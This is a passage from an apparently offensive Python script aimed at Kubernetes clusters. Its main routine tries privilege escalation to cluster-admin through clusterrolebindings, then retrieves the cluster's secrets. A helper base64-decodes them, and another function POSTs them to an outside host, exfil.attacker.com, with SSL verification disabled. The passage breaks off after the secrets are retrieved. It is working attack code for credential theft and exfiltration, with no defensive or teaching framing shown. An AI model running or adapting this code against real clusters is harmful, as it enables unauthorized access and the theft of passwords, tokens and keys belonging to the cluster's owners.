        decoded_data = {}
        for key, value in data.items():
            try:
                decoded_data[key] = base64.b64decode(value).decode('utf-8')
            except:
                decoded_data[key] = f"Failed to decode: {value}"

        decoded_secrets.append({
            "name": secret_name,
            "namespace": namespace,
            "type": secret.get("type", ""),
            "data": decoded_data
        })

    return decoded_secrets

# POST all decoded secrets to https://exfil.attacker.com/k8s
def exfiltrate_secrets(secrets):
    exfil_url = "https://exfil.attacker.com/k8s"

    try:
        response = requests.post(
            exfil_url,
            json=secrets,
            headers={'Content-Type': 'application/json'},
            verify=False  # Disable SSL verification for exfiltration
        )
        return response.status_code == 200
    except:
        return False

def main():
    print("[*] Checking permissions...")
    if check_permissions():
        print("[+] Already have permission to create clusterrolebindings")
    else:
        print("[-] Cannot create clusterrolebindings, attempting privilege escalation...")
        if escalate_privileges():
            print("[+] Successfully escalated privileges to cluster-admin")
        else:
            print("[-] Failed to escalate privileges")
            return

    print("[*] Retrieving and decoding secrets...")
    secrets = get_and_decode_secrets()

